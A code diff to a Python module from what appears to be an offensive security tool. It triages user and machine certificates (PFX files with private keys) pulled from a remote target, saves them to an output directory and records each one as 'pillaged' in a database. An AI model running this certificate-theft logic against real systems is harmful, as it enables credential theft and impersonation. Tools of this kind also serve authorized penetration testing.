@@ -1,5 +1,6 @@
 import hashlib
 import ntpath,copy
+import os
 from typing import Any, Dict, List, Literal, Tuple
 from lib.toolbox import bcolors
 from lib.fileops import MyFileOps
@@ -308,21 +309,26 @@ class CertificatesTriage():
         self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering Certificates Secrets {bcolors.ENDC}")
 
         user_certificates = self.triage_certificates()
+        filedest = os.path.join(self.options.output_directory,self.options.target_ip)
         for cert in user_certificates:
             filename = "%s_%s.pfx" % (cert.username,cert.filename[:16])
-            self.logging.info(f"[{self.options.target_ip}] {bcolors.OKGREEN}[+] Found certificate for user {cert.user.username}. Writing it to {filename}{bcolors.ENDC}")
-            cert.dump() 
-            with open(filename, "wb") as f:
+            full_path = os.path.join(filedest,filename)
+            self.logging.info(f"[{self.options.target_ip}] {bcolors.OKGREEN}[+] Found certificate for user {cert.user.username}. Writing it to {full_path}{bcolors.ENDC}")
+            cert.dump()
+            with open(full_path, "wb") as f:
                 f.write(cert.pfx)
+            self.db.add_certificate(guid=cert.filename, pfx_file_path=full_path, issuer=str(cert.cert.issuer.rfc4514_string()), subject=str(cert.cert.subject.rfc4514_string()), client_auth=cert.clientauth, pillaged_from_computer_ip=self.options.target_ip, pillaged_from_username=cert.user.username)
         for user in self.users:
             if user.username == 'MACHINE$':
                 system_certificates = self.triage_system_certificates(user)
                 for cert in system_certificates:
                     filename = "%s_%s.pfx" % (cert.username,cert.filename[:16])
-                    self.logging.info(f"[{self.options.target_ip}] {bcolors.OKGREEN}[+] Found certificate for MACHINE. Writing it to {filename}{bcolors.ENDC}")
+                    full_path = os.path.join(filedest,filename)
+                    self.logging.info(f"[{self.options.target_ip}] {bcolors.OKGREEN}[+] Found certificate for MACHINE. Writing it to {full_path}{bcolors.ENDC}")
                     cert.dump() 
-                    with open(filename, "wb") as f:
+                    with open(full_path, "wb") as f:
                         f.write(cert.pfx)
+                    self.db.add_certificate(guid=cert.filename, pfx_file_path=full_path, issuer=str(cert.cert.issuer.rfc4514_string()), subject=str(cert.cert.subject.rfc4514_string()), client_auth=cert.clientauth, pillaged_from_computer_ip=self.options.target_ip, pillaged_from_username=user.username)
 
     def triage_system_certificates(self, user: MyUser) -> List[Certificate]:
         certificates = []
